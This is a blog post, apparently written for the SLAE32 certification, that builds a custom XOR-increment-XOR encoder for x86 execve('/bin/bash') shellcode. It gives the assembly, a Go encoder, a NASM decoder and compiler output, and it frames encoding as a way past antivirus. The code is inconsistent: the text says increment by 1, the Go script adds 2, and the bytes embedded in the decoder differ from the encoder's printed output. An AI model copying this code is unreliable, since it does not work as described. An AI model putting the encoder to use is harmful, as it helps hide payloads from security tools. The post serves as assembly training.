<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>SLAE32 - Assignment#4 [Encoder] | bigb0ss</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="SLAE32 - Assignment#4 [Encoder]" /><meta name="author" content="bigb0ss" /><meta property="og:locale" content="en_US" /><meta name="description" content="This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:" /><meta property="og:description" content="This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:" /><link rel="canonical" href="https://bigb0sss.github.io/posts/slae32-assignment-4/" /><meta property="og:url" content="https://bigb0sss.github.io/posts/slae32-assignment-4/" /><meta property="og:site_name" content="bigb0ss" /><meta property="og:image" content="https://bigb0sss.github.io/assets/img/post/slae32/slae32.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-04-21T11:53:00-04:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://bigb0sss.github.io/assets/img/post/slae32/slae32.png" /><meta property="twitter:title" content="SLAE32 - Assignment#4 [Encoder]" /><meta name="twitter:site" content="@bigb0ss___" /><meta name="twitter:creator" content="@bigb0ss" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"headline":"SLAE32 - Assignment#4 [Encoder]","dateModified":"2021-04-21T11:53:00-04:00","description":"This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:","datePublished":"2021-04-21T11:53:00-04:00","@type":"BlogPosting","image":"https://bigb0sss.github.io/assets/img/post/slae32/slae32.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://bigb0sss.github.io/posts/slae32-assignment-4/"},"url":"https://bigb0sss.github.io/posts/slae32-assignment-4/","author":{"@type":"Person","name":"bigb0ss"},"@context":"https://schema.org"}</script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <script src="/assets/js/post.min.js" async></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-QE26N8SZTJ"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-QE26N8SZTJ'); </script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/bigb0ss/bigb0ss.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">bigb0ss</a></div><div class="site-subtitle font-italic">OSCE | OSCP | Security Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.linkedin.com/in/danielsmin" target="_blank"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/bigb0sss" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/bigb0ss___" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>SLAE32 - Assignment#4 [Encoder]</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>SLAE32 - Assignment#4 [Encoder]</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Apr 21, 2021" > Apr 21 <i class="unloaded">2021-04-21T11:53:00-04:00</i> </span> by <span class="author"> bigb0ss </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/post/slae32/slae32.png" class="post-preview-img"><p><b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b></p><p><b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b></p><p><b>Student ID: SLAE-1542</b></p><p><a href="https://github.com/bigb0sss/SLAE32">SLAE32 Assignemt#4 Github</a></p><h1 id="assignement-4">Assignement #4</h1><ul><li>Create a custom encoding scheme like the “Insertion Encoder”<li>PoC with using execve-stack as the shellcode to encode with your schema and execute</ul><h1 id="custom-encoder">Custom Encoder</h1><p>An encoder can be used fro various purposes. For example, Base64 encodes binary data into an ASCII characters which are known to pretty much every computer system. Or one may use an encoder to mangle their code to potentially bypass a security product such as AV. Today, I will demonstrate a simple custom econding scheme for a x86 shellcode.</p><h1 id="encoding-scheme">Encoding Scheme</h1><p>An encoding scheme we will use is: 1) XOR by 0x05 2) Increment by 1 3) XOR by 0x11</p><h1 id="original-shellcode">Original Shellcode</h1><p>I will be using the following <code class="language-plaintext highlighter-rouge">/bin/bash</code> shellcode as an original shellcode and apply a custom encoding to it.</p><div class="language-nasm highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre><td class="rouge-code"><pre><span class="c1">; bash.nasm</span>

<span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

	<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>		<span class="c1">; Preparing Nulls in EAX register</span>
	<span class="nf">push</span> <span class="nb">eax</span>			<span class="c1">; Pushing the first Null DWORD</span>
	
	<span class="c1">; ////bin/bash (12 bytes) - "/" does not affect when running "/bin/bash" while being interpretated</span>
	<span class="c1">;</span>
	<span class="c1">; [Reverse order of ////bin/bash]</span>
	<span class="c1">; String length : 12</span>
	<span class="c1">; hsab : 68736162</span>
	<span class="c1">; /nib : 2f6e6962</span>
	<span class="c1">; //// : 2f2f2f2f</span>
	
	<span class="nf">push</span> <span class="mh">0x68736162</span>
	<span class="nf">push</span> <span class="mh">0x2f6e6962</span>
	<span class="nf">push</span> <span class="mh">0x2f2f2f2f</span>
	
	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
	<span class="nf">push</span> <span class="nb">eax</span>
	<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
	<span class="nf">push</span> <span class="nb">ebx</span>
	<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
	
	<span class="c1">; syscall()</span>
	<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xb</span>
	<span class="nf">int</span> <span class="mh">0x80</span>
</pre></table></code></div></div><p>Using the compilerX86.py, we can retrieve the shellcode from the <code class="language-plaintext highlighter-rouge">bash.nasm</code> file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c"># python compilerX86.py -f bash</span>
 
  ________  ________  _____ ______   ________  ___  ___       _______   ________     ___    ___ ________  ________         
 |<span class="se">\ </span>  ____<span class="se">\|\ </span>  __  <span class="se">\|\ </span>  _ <span class="se">\ </span> _   <span class="se">\|\ </span>  __  <span class="se">\|\ </span> <span class="se">\|\ </span> <span class="se">\ </span>    |<span class="se">\ </span> ___ <span class="se">\ </span>|<span class="se">\ </span>  __  <span class="se">\ </span>  |<span class="se">\ </span> <span class="se">\ </span> /  /|<span class="se">\ </span>  __  <span class="se">\|\ </span>  ____<span class="se">\ </span>       
 <span class="se">\ \ </span> <span class="se">\_</span>__|<span class="se">\ \ </span> <span class="se">\|\ </span> <span class="se">\ \ </span> <span class="se">\\\_</span>_<span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\|\ </span> <span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\ </span>   <span class="se">\ \ </span>  __/|<span class="se">\ \ </span> <span class="se">\|\ </span> <span class="se">\ </span> <span class="se">\ \ </span> <span class="se">\/</span>  / | <span class="se">\ </span> <span class="se">\|\ </span> <span class="se">\ \ </span> <span class="se">\_</span>__|      
  <span class="se">\ \ </span> <span class="se">\ </span>   <span class="se">\ \ </span> <span class="se">\\\ </span> <span class="se">\ \ </span> <span class="se">\\</span>|__| <span class="se">\ </span> <span class="se">\ \ </span>  ____<span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\ </span>   <span class="se">\ \ </span> <span class="se">\_</span>|/_<span class="se">\ \ </span>  _  _<span class="se">\ </span> <span class="se">\ \ </span>   / / <span class="se">\ \ </span>  __  <span class="se">\ \ </span> <span class="se">\_</span>___   
   <span class="se">\ \ </span> <span class="se">\_</span>___<span class="se">\ \ </span> <span class="se">\\\ </span> <span class="se">\ \ </span> <span class="se">\ </span>   <span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\_</span>__|<span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\_</span>___<span class="se">\ \ </span> <span class="se">\_</span>|<span class="se">\ \ \ </span> <span class="se">\\</span>  <span class="se">\|</span>  /     <span class="se">\/</span>   <span class="se">\ \ </span> <span class="se">\|\ </span> <span class="se">\ \ </span> ___  <span class="se">\ </span>
    <span class="se">\ \_</span>______<span class="se">\ \_</span>______<span class="se">\ \_</span>_<span class="se">\ </span>   <span class="se">\ \_</span>_<span class="se">\ \_</span>_<span class="se">\ </span>   <span class="se">\ \_</span>_<span class="se">\ \_</span>______<span class="se">\ \_</span>______<span class="se">\ \_</span>_<span class="se">\\</span> _<span class="se">\ </span>/  /<span class="se">\ </span>  <span class="se">\ </span>   <span class="se">\ \_</span>______<span class="se">\ \_</span>______<span class="se">\ </span>
     <span class="se">\|</span>_______|<span class="se">\|</span>_______|<span class="se">\|</span>__|     <span class="se">\|</span>__|<span class="se">\|</span>__|     <span class="se">\|</span>__|<span class="se">\|</span>_______|<span class="se">\|</span>_______|<span class="se">\|</span>__|<span class="se">\|</span>__/__/ /<span class="se">\ </span>__<span class="se">\ </span>   <span class="se">\|</span>_______|<span class="se">\|</span>_______|    
                                                                                    |__|/ <span class="se">\|</span>__|     <span class="o">[</span>bigb0ss] v1.0         

<span class="o">[</span>+] Assemble: bash.nasm
<span class="o">[</span>+] Linking: bash.o
<span class="o">[</span>+] Shellcode: <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">61</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80"</span>
<span class="o">[</span>+] ASM code: 0x31,0xc0,0x50,0x68,0x62,0x61,0x73,0x68,0x68,0x62,0x69,0x6e,0x2f,0x68,0x2f,0x2f,0x2f,0x2f,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80
<span class="o">[</span>+] Creating File: shellcode.c
<span class="o">[</span>+] Compiling Executable: shellcode
<span class="o">[</span>+] Enjoy!
</pre></table></code></div></div><h1 id="encoder">Encoder</h1><p>As per our encoding scheme, we can encode the retrieved shellcode by using the following Go script.</p><div class="language-go highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="s">"fmt"</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>

	<span class="c">// Hard-coded original shellcode</span>
	<span class="n">shellcode</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">{</span><span class="m">0x31</span><span class="p">,</span> <span class="m">0xc0</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x62</span><span class="p">,</span> <span class="m">0x61</span><span class="p">,</span> <span class="m">0x73</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x62</span><span class="p">,</span> <span class="m">0x69</span><span class="p">,</span> <span class="m">0x6e</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x68</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x2f</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xe3</span><span class="p">,</span> <span class="m">0x50</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xe2</span><span class="p">,</span> <span class="m">0x53</span><span class="p">,</span> <span class="m">0x89</span><span class="p">,</span> <span class="m">0xe1</span><span class="p">,</span> <span class="m">0xb0</span><span class="p">,</span> <span class="m">0x0b</span><span class="p">,</span> <span class="m">0xcd</span><span class="p">,</span> <span class="m">0x80</span><span class="p">}</span>

	<span class="k">var</span> <span class="n">key1</span> <span class="kt">byte</span> <span class="o">=</span> <span class="m">0x05</span> <span class="c">// 1st XOR value</span>
	<span class="k">var</span> <span class="n">key2</span> <span class="kt">byte</span> <span class="o">=</span> <span class="m">0x11</span> <span class="c">// 2nd XOR value</span>

	<span class="n">encodedShellcode</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>

	<span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">shellcode</span> <span class="p">{</span>

		<span class="n">xor1</span> <span class="o">:=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key1</span> <span class="c">// 1st XOR by 0x05</span>
		<span class="n">inc</span> <span class="o">:=</span> <span class="n">xor1</span> <span class="o">+</span> <span class="m">2</span>             <span class="c">// Increment by 2</span>
		<span class="n">xor2</span> <span class="o">:=</span> <span class="n">inc</span> <span class="o">^</span> <span class="n">key2</span>          <span class="c">// 2nd XOR by 0x11</span>
		<span class="n">encodedShellcode</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">xor2</span>
	<span class="p">}</span>

	<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"[INFO] Lengh: %v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">encodedShellcode</span><span class="p">))</span>
	<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"[INFO] Encoded Shellcode: "</span><span class="p">)</span>

	<span class="k">for</span> <span class="n">c</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">c</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">encodedShellcode</span><span class="p">);</span> <span class="n">c</span><span class="o">++</span> <span class="p">{</span>

		<span class="k">if</span> <span class="n">encodedShellcode</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">&lt;</span> <span class="m">16</span> <span class="p">{</span> <span class="c">// Here to check if the Hex value is a single digit.</span>

			<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"0x0%x,"</span><span class="p">,</span> <span class="n">encodedShellcode</span><span class="p">[</span><span class="n">c</span><span class="p">])</span>

		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>

			<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"0x%x,"</span><span class="p">,</span> <span class="n">encodedShellcode</span><span class="p">[</span><span class="n">c</span><span class="p">])</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>When we run the script, we can get the XOR-Increment-XOR encoded shellcode.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c"># go run encoder.go</span>
<span class="o">[</span>INFO] Lengh: 30
<span class="o">[</span>INFO] Encoded Shellcode: 0x27,0xd6,0x46,0x7e,0x78,0x77,0x69,0x7e,0x7e,0x78,0x7f,0x7c,0x3d,0x7e,0x3d,0x3d,0x3d,0x3d,0x9f,0xf9,0x46,0x9f,0xf8,0x49,0x9f,0xf7,0xa6,0x01,0xdb,0x96,
</pre></table></code></div></div><h1 id="decoder">Decoder</h1><p>Now let’s create a decoder in ASM. We will introduce a technique called JMP-Call-POP to place the encoded shellcode in <code class="language-plaintext highlighter-rouge">ESI</code> register and start our decoding process.</p><pre><code class="language-nsam">; Executable name : decoder
; Version         : 1.0
; Created date    : 04/21/2021
; Last update     : 04/21/2021
; Author          : bigb0ss
; Description     : This is to run XOR-Increment-XOR decode for the "/bin/sh" shellcode
;

global _start

section .text

_start:

    jmp short call_decoder    ; JMP to "call_decoder" 

decoder:

    pop esi                   ; POPing "shellcode" on the ESI register
	xor ecx, ecx		      ; Zero out ECX
	xor edx, edx		      ; Zero out EDX
	mov dl, 30		     	  ; Move 30 (lengh of shellcode) to c low  
 
decode_loop:
	
	cmp ecx, edx		      ; Check if our loop is done for 30 times
	je encodedshellcode

    xor byte [esi], 0x11      ; 2nd XOR by 0x11
	dec byte [esi]		      ; Decrement by 1
	xor byte [esi], 0x05	  ; 1st XOR by 0x05

	inc esi
	inc ecx	
	jmp short decode_loop

call_decoder:

      call decoder                    ; CALL "decoder"
      encodedshellcode: db 0x24,0xd7,0x47,0x7f,0x79,0x74,0x66,0x7f,0x7f,0x79,0x7c,0x7d,0x3a,0x7f,0x3a,0x3a,0x3a,0x3a,0x9c,0xf6,0x47,0x9c,0xf9,0x46,0x9c,0xf4,0xa7,0x1e,0xd8,0x97
</code></pre><p>Finally, let’s compile the <code class="language-plaintext highlighter-rouge">decoder.nasm</code> with complierX86.py again.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="c"># python compilerX86.py -f decoder</span>
 
  ________  ________  _____ ______   ________  ___  ___       _______   ________     ___    ___ ________  ________         
 |<span class="se">\ </span>  ____<span class="se">\|\ </span>  __  <span class="se">\|\ </span>  _ <span class="se">\ </span> _   <span class="se">\|\ </span>  __  <span class="se">\|\ </span> <span class="se">\|\ </span> <span class="se">\ </span>    |<span class="se">\ </span> ___ <span class="se">\ </span>|<span class="se">\ </span>  __  <span class="se">\ </span>  |<span class="se">\ </span> <span class="se">\ </span> /  /|<span class="se">\ </span>  __  <span class="se">\|\ </span>  ____<span class="se">\ </span>       
 <span class="se">\ \ </span> <span class="se">\_</span>__|<span class="se">\ \ </span> <span class="se">\|\ </span> <span class="se">\ \ </span> <span class="se">\\\_</span>_<span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\|\ </span> <span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\ </span>   <span class="se">\ \ </span>  __/|<span class="se">\ \ </span> <span class="se">\|\ </span> <span class="se">\ </span> <span class="se">\ \ </span> <span class="se">\/</span>  / | <span class="se">\ </span> <span class="se">\|\ </span> <span class="se">\ \ </span> <span class="se">\_</span>__|      
  <span class="se">\ \ </span> <span class="se">\ </span>   <span class="se">\ \ </span> <span class="se">\\\ </span> <span class="se">\ \ </span> <span class="se">\\</span>|__| <span class="se">\ </span> <span class="se">\ \ </span>  ____<span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\ </span>   <span class="se">\ \ </span> <span class="se">\_</span>|/_<span class="se">\ \ </span>  _  _<span class="se">\ </span> <span class="se">\ \ </span>   / / <span class="se">\ \ </span>  __  <span class="se">\ \ </span> <span class="se">\_</span>___   
   <span class="se">\ \ </span> <span class="se">\_</span>___<span class="se">\ \ </span> <span class="se">\\\ </span> <span class="se">\ \ </span> <span class="se">\ </span>   <span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\_</span>__|<span class="se">\ \ </span> <span class="se">\ \ </span> <span class="se">\_</span>___<span class="se">\ \ </span> <span class="se">\_</span>|<span class="se">\ \ \ </span> <span class="se">\\</span>  <span class="se">\|</span>  /     <span class="se">\/</span>   <span class="se">\ \ </span> <span class="se">\|\ </span> <span class="se">\ \ </span> ___  <span class="se">\ </span>
    <span class="se">\ \_</span>______<span class="se">\ \_</span>______<span class="se">\ \_</span>_<span class="se">\ </span>   <span class="se">\ \_</span>_<span class="se">\ \_</span>_<span class="se">\ </span>   <span class="se">\ \_</span>_<span class="se">\ \_</span>______<span class="se">\ \_</span>______<span class="se">\ \_</span>_<span class="se">\\</span> _<span class="se">\ </span>/  /<span class="se">\ </span>  <span class="se">\ </span>   <span class="se">\ \_</span>______<span class="se">\ \_</span>______<span class="se">\ </span>
     <span class="se">\|</span>_______|<span class="se">\|</span>_______|<span class="se">\|</span>__|     <span class="se">\|</span>__|<span class="se">\|</span>__|     <span class="se">\|</span>__|<span class="se">\|</span>_______|<span class="se">\|</span>_______|<span class="se">\|</span>__|<span class="se">\|</span>__/__/ /<span class="se">\ </span>__<span class="se">\ </span>   <span class="se">\|</span>_______|<span class="se">\|</span>_______|    
                                                                                    |__|/ <span class="se">\|</span>__|     <span class="o">[</span>bigb0ss] v1.0         

<span class="o">[</span>+] Assemble: decoder.nasm
<span class="o">[</span>+] Linking: decoder.o
<span class="o">[</span>+] Shellcode: <span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">17</span><span class="se">\x</span><span class="s2">5e</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">39</span><span class="se">\x</span><span class="s2">d1</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">11</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">0e</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">36</span><span class="se">\x</span><span class="s2">05</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">f0</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">e4</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">d7</span><span class="se">\x</span><span class="s2">47</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">66</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">7f</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">7c</span><span class="se">\x</span><span 